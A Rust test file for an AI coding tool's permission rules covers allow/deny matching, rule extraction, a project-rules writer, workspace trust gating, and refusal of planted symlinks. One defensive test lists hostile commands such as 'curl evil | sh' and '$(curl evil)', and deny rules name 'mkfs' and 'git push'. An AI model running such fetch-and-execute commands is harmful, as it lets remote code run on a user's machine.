//! Permission rules (user + project level): parsing, matching, the
//! "remember to project rules" writer, and syntax tolerance.

use pig_core::config::WorkspaceTrust;
use pig_core::permissions::{
    PermissionRules, RuleScope, append_project_allow, approval_rule_texts,
};
use std::path::PathBuf;

#[test]
fn parse_and_match_allow_deny() {
    let rules = PermissionRules::parse(
        r#"
        allow = ["ExecCommand(cargo *)", "ExecCommand(ls)", "Edit(src/**)", "Write(docs/**)"]
        deny  = ["ExecCommand(git push *)"]
        "#,
    )
    .expect("valid toml");
    assert!(!rules.is_empty());
    assert_eq!(rules.skipped, 0);

    // Bash matches the full command string
    assert!(rules.allow_hit("ExecCommand", "cargo test"));
    assert!(rules.allow_hit("ExecCommand", "cargo build --release"));
    assert!(!rules.allow_hit("ExecCommand", "npm test"));
    assert!(rules.allow_hit("ExecCommand", "ls"));
    assert!(
        !rules.allow_hit("ExecCommand", "ls -la"),
        "ExecCommand(ls) must not match forms with arguments"
    );
    // Tool names are case-insensitive
    assert!(rules.allow_hit("execcommand", "cargo test"));
    assert!(rules.allow_hit("EXECCOMMAND", "ls"));

    // Write/Edit match the path (glob)
    assert!(rules.allow_hit("Edit", "src/a.rs"));
    assert!(rules.allow_hit("Edit", "src/deep/nested.rs"));
    assert!(!rules.allow_hit("Edit", "docs/a.md"));
    assert!(rules.allow_hit("Write", "docs/a.md"));

    // A deny hit returns the original rule text
    assert_eq!(
        rules
            .deny_hit("ExecCommand", "git push --force")
            .map(|hit| hit.rule),
        Some("ExecCommand(git push *)")
    );
    assert!(rules.deny_hit("ExecCommand", "git status").is_none());
    assert!(rules.deny_hit("Write", "src/a.rs").is_none());
}

#[test]
fn backslash_subject_normalized() {
    let rules = PermissionRules::parse(r#"deny = ["Edit(src/**)"]"#).unwrap();
    assert!(
        rules.deny_hit("Edit", "src\\win\\a.rs").is_some(),
        "backslashes are normalized to / before matching"
    );
}

#[test]
fn missing_file_is_empty_rules() {
    let dir = std::env::temp_dir().join(format!("pig-core-perms-none-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let rules = PermissionRules::load(&dir).expect("missing file means empty rules");
    assert!(rules.is_empty());
    assert!(!rules.allow_hit("ExecCommand", "anything"));
    assert!(rules.deny_hit("ExecCommand", "anything").is_none());
}

#[test]
fn invalid_toml_is_error() {
    let err = PermissionRules::parse("allow = [not toml").unwrap_err();
    assert!(
        matches!(err, pig_protocol::CoreError::PermissionsParse { .. }),
        "{err:?}"
    );
}

#[test]
fn malformed_rules_skipped_and_counted() {
    let rules = PermissionRules::parse(
        r#"
        allow = ["ExecCommand(cargo *)", "not-a-rule", "(no tool name)", "Edit(src/**"]
        "#,
    )
    .expect("malformed rules must not break overall parsing");
    assert_eq!(
        rules.skipped, 3,
        "3 invalid rules should be skipped and counted"
    );
    assert!(
        rules.allow_hit("ExecCommand", "cargo check"),
        "valid rules still take effect"
    );
}

/// The public project loader defaults to **untrusted**: repository-authored
/// `allow` rules are inert unless the explicit trust token admits the
/// workspace; the project's denials always apply. Runtime code uses
/// `load_layered_with_trust` with the session's decision.
#[test]
fn project_load_defaults_to_untrusted_denials_only() {
    let dir = std::env::temp_dir().join(format!("pig-core-perms-load-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(dir.join(".pigcode")).unwrap();
    std::fs::write(
        dir.join(".pigcode/permissions.toml"),
        "allow = [\"ExecCommand(cargo *)\"]\ndeny = [\"ExecCommand(git push *)\"]\n",
    )
    .unwrap();

    let rules = PermissionRules::load(&dir).unwrap();
    assert!(
        !rules.allow_hit("ExecCommand", "cargo test"),
        "an untrusted project allow must not skip approval"
    );
    assert!(
        rules.deny_hit("ExecCommand", "git push --force").is_some(),
        "project denials remain in force untrusted"
    );

    let (trusted, errors) = PermissionRules::load_layered_with_trust(
        &dir,
        &dir.join("data"),
        &WorkspaceTrust::new(&dir, /*trusted*/ true),
    );
    assert!(errors.is_empty(), "{errors:?}");
    assert!(
        trusted.allow_hit("ExecCommand", "cargo test"),
        "the explicit trust-aware API admits the project allow"
    );
    assert!(
        trusted
            .deny_hit("ExecCommand", "git push --force")
            .is_some()
    );
    let _ = std::fs::remove_dir_all(&dir);
}

fn temp_dir(name: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!("pig-core-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    dir
}

/// Project rules under an explicit trust decision (the runtime API); the
/// public `load` convenience is fail-closed and would drop the allow rules the
/// writer tests want to observe.
fn load_project_trusted(dir: &std::path::Path) -> PermissionRules {
    let (rules, errors) = PermissionRules::load_layered_with_trust(
        dir,
        &dir.join("data"),
        &WorkspaceTrust::new(dir, /*trusted*/ true),
    );
    assert!(errors.is_empty(), "{errors:?}");
    rules
}

// ---------- Conservative rule extraction (the "remember to project rules" payload) ----------

#[test]
fn bash_rules_use_the_executable_and_an_alphabetic_subcommand() {
    assert_eq!(
        approval_rule_texts("ExecCommand", "git status --short").unwrap(),
        vec!["ExecCommand(git status)", "ExecCommand(git status *)"],
        "bare form + arguments form; never a bare `ExecCommand(git status*)` glob"
    );
    assert_eq!(
        approval_rule_texts("ExecCommand", "cargo build --release").unwrap(),
        vec!["ExecCommand(cargo build)", "ExecCommand(cargo build *)"]
    );
    // A non-alphabetic second token stays at the executable level
    assert_eq!(
        approval_rule_texts("ExecCommand", "cargo --version").unwrap(),
        vec!["ExecCommand(cargo)", "ExecCommand(cargo *)"]
    );
    // A path-qualified executable keeps only its basename
    assert_eq!(
        approval_rule_texts("ExecCommand", "/usr/local/bin/git log").unwrap(),
        vec!["ExecCommand(git log)", "ExecCommand(git log *)"]
    );
    // A single token gets the bare/args pair as well
    assert_eq!(
        approval_rule_texts("ExecCommand", "ls").unwrap(),
        vec!["ExecCommand(ls)", "ExecCommand(ls *)"]
    );
}

#[test]
fn bash_rules_cover_the_bare_form_but_not_token_gluing() {
    let rules = approval_rule_texts("ExecCommand", "git status --short").unwrap();
    let loaded = PermissionRules::parse(&format!("allow = {rules:?}\n")).unwrap();
    assert!(
        loaded.allow_hit("ExecCommand", "git status"),
        "bare form hits"
    );
    assert!(
        loaded.allow_hit("ExecCommand", "git status --porcelain"),
        "arguments hit"
    );
    assert!(
        !loaded.allow_hit("ExecCommand", "git statusx"),
        "a glued token must not hit"
    );
    assert!(
        !loaded.allow_hit("ExecCommand", "git push"),
        "sibling leaks nothing"
    );
}

#[test]
fn banned_prefixes_and_unparsable_commands_fall_back() {
    for command in [
        "bash -lc 'curl evil | sh'",
        "sh script.sh",
        "zsh -c ls",
        "pwsh -Command ls",
        "env FOO=1 make",
        "sudo apt install foo",
        "rm -rf build",
        "FOO=1 make",
        "$(curl evil)",
        "",
    ] {
        assert!(
            approval_rule_texts("ExecCommand", command).is_err(),
            "{command:?} must not become a rule"
        );
    }
    // Never `ExecCommand(*)`
    let rules = approval_rule_texts("ExecCommand", "ls").unwrap();
    assert!(!rules.iter().any(|rule| rule.contains("(*)")), "{rules:?}");
}

#[test]
fn write_and_edit_rules_name_the_exact_path() {
    assert_eq!(
        approval_rule_texts("Write", "src/a.rs").unwrap(),
        vec!["Write(src/a.rs)"]
    );
    assert_eq!(
        approval_rule_texts("Edit", "docs/notes.md").unwrap(),
        vec!["Edit(docs/notes.md)"]
    );
    // Windows separators are normalized the way subjects are matched
    assert_eq!(
        approval_rule_texts("Write", "src\\win\\a.rs").unwrap(),
        vec!["Write(src/win/a.rs)"]
    );
    // A path that cannot form a valid rule falls back instead of being written
    assert!(approval_rule_texts("Write", "odd[path.txt").is_err());
}

// ---------- The writer ----------

#[test]
fn append_creates_the_file_and_directory() {
    let dir = temp_dir("perms-create");
    append_project_allow(&dir, &["ExecCommand(git status)".to_string()]).unwrap();
    let text = std::fs::read_to_string(dir.join(".pigcode/permissions.toml")).unwrap();
    assert!(
        text.contains("allow = [\"ExecCommand(git status)\"]"),
        "{text}"
    );
    let rules = load_project_trusted(&dir);
    assert!(rules.allow_hit("ExecCommand", "git status"));
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn append_extends_an_existing_array_and_keeps_the_rest() {
    let dir = temp_dir("perms-append");
    std::fs::create_dir_all(dir.join(".pigcode")).unwrap();
    let original = "# hand-written header\ndeny = [\"ExecCommand(git push *)\"]\nallow = [\"ExecCommand(cargo *)\"]\n";
    std::fs::write(dir.join(".pigcode/permissions.toml"), original).unwrap();
    append_project_allow(&dir, &["Write(docs/a.md)".to_string()]).unwrap();
    let text = std::fs::read_to_string(dir.join(".pigcode/permissions.toml")).unwrap();
    assert!(
        text.contains("# hand-written header"),
        "comments kept: {text}"
    );
    assert!(
        text.contains("deny = [\"ExecCommand(git push *)\"]"),
        "other keys kept: {text}"
    );
    let rules = load_project_trusted(&dir);
    assert!(
        rules.allow_hit("ExecCommand", "cargo test"),
        "old allow kept"
    );
    assert!(rules.allow_hit("Write", "docs/a.md"), "new allow added");
    assert!(
        rules.deny_hit("ExecCommand", "git push --force").is_some(),
        "deny kept"
    );
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn append_adds_a_missing_allow_key_at_top_level() {
    let dir = temp_dir("perms-noallow");
    std::fs::create_dir_all(dir.join(".pigcode")).unwrap();
    std::fs::write(
        dir.join(".pigcode/permissions.toml"),
        "# rules\ndeny = [\"Edit(secrets/**)\"]\n\n[hooks]\ntimeout = 5\n",
    )
    .unwrap();
    append_project_allow(&dir, &["ExecCommand(git status *)".to_string()]).unwrap();
    let text = std::fs::read_to_string(dir.join(".pigcode/permissions.toml")).unwrap();
    let rules = load_project_trusted(&dir);
    assert!(
        rules.allow_hit("ExecCommand", "git status --short"),
        "{text}"
    );
    assert!(rules.deny_hit("Edit", "secrets/a").is_some(), "deny kept");
    assert!(text.contains("[hooks]"), "table kept: {text}");
    // The new key really is top-level: `toml` sees it beside `deny`
    let value: toml::Value = toml::from_str(&text).unwrap();
    assert!(value.get("allow").is_some(), "top-level allow: {text}");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn append_tolerates_a_malformed_file_without_writing() {
    let dir = temp_dir("perms-malformed");
    std::fs::create_dir_all(dir.join(".pigcode")).unwrap();
    let broken = "allow = [not toml";
    std::fs::write(dir.join(".pigcode/permissions.toml"), broken).unwrap();
    let error = append_project_allow(&dir, &["ExecCommand(ls *)".to_string()]).unwrap_err();
    assert!(error.contains("not valid TOML"), "{error}");
    assert_eq!(
        std::fs::read_to_string(dir.join(".pigcode/permissions.toml")).unwrap(),
        broken,
        "the broken file is left untouched (never overwritten)"
    );
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn append_does_not_duplicate_an_existing_rule() {
    let dir = temp_dir("perms-dup");
    std::fs::create_dir_all(dir.join(".pigcode")).unwrap();
    std::fs::write(
        dir.join(".pigcode/permissions.toml"),
        "allow = [\"ExecCommand(ls *)\"]\n",
    )
    .unwrap();
    append_project_allow(&dir, &["ExecCommand(ls *)".to_string()]).unwrap();
    let text = std::fs::read_to_string(dir.join(".pigcode/permissions.toml")).unwrap();
    assert_eq!(text.matches("ExecCommand(ls *)").count(), 1, "{text}");
    let _ = std::fs::remove_dir_all(&dir);
}

/// A cloned repository can contain `.pigcode/permissions.toml` as a symlink.
/// "Remember to project rules" must never read and replace the link target
/// (an arbitrary file the user owns); it refuses the planted link instead.
#[cfg(unix)]
#[test]
fn append_refuses_a_planted_symlinked_rules_file() {
    let dir = temp_dir("perms-link-file");
    let dummy = temp_dir("perms-link-file-dummy");
    std::fs::create_dir_all(dir.join(".pigcode")).unwrap();
    let target = dummy.join("user-toml.toml");
    let original = "allow = [\"ExecCommand(cargo build)\"]\n";
    std::fs::write(&target, original).unwrap();
    std::os::unix::fs::symlink(&target, dir.join(".pigcode/permissions.toml")).unwrap();

    let error = append_project_allow(&dir, &["ExecCommand(git status)".to_string()]).unwrap_err();
    assert!(error.contains("symbolic link"), "{error}");
    assert_eq!(
        std::fs::read_to_string(&target).unwrap(),
        original,
        "the link target is never modified"
    );
    assert!(
        std::fs::symlink_metadata(dir.join(".pigcode/permissions.toml"))
            .unwrap()
            .file_type()
            .is_symlink(),
        "the planted link is left untouched"
    );
    let _ = std::fs::remove_dir_all(&dir);
    let _ = std::fs::remove_dir_all(&dummy);
}

/// The `.pigcode` directory itself may be a symlink in a cloned repository:
/// writing through it would create the rules file outside the workspace.
#[cfg(unix)]
#[test]
fn append_refuses_a_planted_symlinked_pigcode_directory() {
    let dir = temp_dir("perms-link-dir");
    let dummy = temp_dir("perms-link-dir-dummy");
    std::os::unix::fs::symlink(&dummy, dir.join(".pigcode")).unwrap();

    let error = append_project_allow(&dir, &["ExecCommand(git status)".to_string()]).unwrap_err();
    assert!(error.contains("symbolic link"), "{error}");
    assert!(
        !dummy.join("permissions.toml").exists(),
        "nothing is created through the linked directory"
    );
    let _ = std::fs::remove_dir_all(&dir);
    let _ = std::fs::remove_dir_all(&dummy);
}

// ---------- Two levels: user file + project file ----------

#[test]
fn user_and_project_rules_union_and_deny_wins_across_levels() {
    let dir = temp_dir("perms-levels");
    let data_dir = dir.join("data");
    std::fs::create_dir_all(&data_dir).unwrap();
    std::fs::create_dir_all(dir.join(".pigcode")).unwrap();
    std::fs::write(
        data_dir.join("permissions.toml"),
        "allow = [\"ExecCommand(npm *)\"]\ndeny = [\"Write(shared/**)\"]\n",
    )
    .unwrap();
    std::fs::write(
        dir.join(".pigcode/permissions.toml"),
        "allow = [\"ExecCommand(cargo *)\", \"Write(shared/**)\"]\n",
    )
    .unwrap();

    let trust = WorkspaceTrust::new(&dir, /*trusted*/ true);
    let (rules, errors) = PermissionRules::load_layered_with_trust(&dir, &data_dir, &trust);
    assert!(errors.is_empty(), "both levels parse: {errors:?}");
    assert!(rules.allow_hit("ExecCommand", "npm test"), "user allow");
    assert!(
        rules.allow_hit("ExecCommand", "cargo test"),
        "project allow applies in a trusted workspace"
    );
    let hit = rules
        .deny_hit("Write", "shared/a.txt")
        .expect("the user-level deny wins over the project-level allow");
    assert!(hit.note().contains("user rule"), "{}", hit.note());
    assert!(
        hit.note().contains("permissions.toml"),
        "the note names the file: {}",
        hit.note()
    );
    let project_hit = rules.deny_hit("ExecCommand", "x");
    assert!(project_hit.is_none());
    let _ = std::fs::remove_dir_all(&dir);
}

/// An untrusted workspace never gets its project `allow` rules applied (no
/// approval bypass), while its `deny` rules remain additive.
#[test]
fn an_untrusted_project_contributes_denials_only() {
    let dir = temp_dir("perms-untrusted");
    let data_dir = dir.join("data");
    std::fs::create_dir_all(&data_dir).unwrap();
    std::fs::create_dir_all(dir.join(".pigcode")).unwrap();
    std::fs::write(
        data_dir.join("permissions.toml"),
        "allow = [\"ExecCommand(npm *)\"]\n",
    )
    .unwrap();
    std::fs::write(
        dir.join(".pigcode/permissions.toml"),
        "allow = [\"ExecCommand(cargo *)\"]\ndeny = [\"ExecCommand(git push *)\"]\n",
    )
    .unwrap();

    let (rules, errors) = PermissionRules::load_layered(&dir, &data_dir);
    assert!(errors.is_empty(), "both levels parse: {errors:?}");
    assert!(rules.allow_hit("ExecCommand", "npm test"), "user allow");
    assert!(
        !rules.allow_hit("ExecCommand", "cargo test"),
        "an untrusted project allow must not bypass approval"
    );
    assert!(
        rules.deny_hit("ExecCommand", "git push --force").is_some(),
        "a project deny stays additive"
    );

    let trust = WorkspaceTrust::new(&dir, /*trusted*/ true);
    let (trusted, _) = PermissionRules::load_layered_with_trust(&dir, &data_dir, &trust);
    assert!(
        trusted.allow_hit("ExecCommand", "cargo test"),
        "trust admits the project allow"
    );
    // A trust token for another workspace does not admit this one.
    let elsewhere = WorkspaceTrust::new(&data_dir, /*trusted*/ true);
    let (other, _) = PermissionRules::load_layered_with_trust(&dir, &data_dir, &elsewhere);
    assert!(!other.allow_hit("ExecCommand", "cargo test"));
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn a_malformed_level_is_skipped_and_the_other_still_loads() {
    let dir = temp_dir("perms-mixed");
    let data_dir = dir.join("data");
    std::fs::create_dir_all(&data_dir).unwrap();
    std::fs::create_dir_all(dir.join(".pigcode")).unwrap();
    std::fs::write(data_dir.join("permissions.toml"), "allow = [broken").unwrap();
    std::fs::write(
        dir.join(".pigcode/permissions.toml"),
        "deny = [\"ExecCommand(mkfs*)\"]\n",
    )
    .unwrap();
    let (rules, errors) = PermissionRules::load_layered(&dir, &data_dir);
    assert_eq!(errors.len(), 1, "the broken user level is reported");
    assert!(
        rules.deny_hit("ExecCommand", "mkfs").is_some(),
        "the project level still applies"
    );
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn project_deny_note_names_the_project_file() {
    let rules = PermissionRules::parse("deny = [\"ExecCommand(git push *)\"]\n").unwrap();
    let hit = rules.deny_hit("ExecCommand", "git push --force").unwrap();
    assert_eq!(hit.scope, RuleScope::Project);
    assert_eq!(
        hit.note(),
        "Blocked by a project rule: ExecCommand(git push *) (.pigcode/permissions.toml)"
    );
}
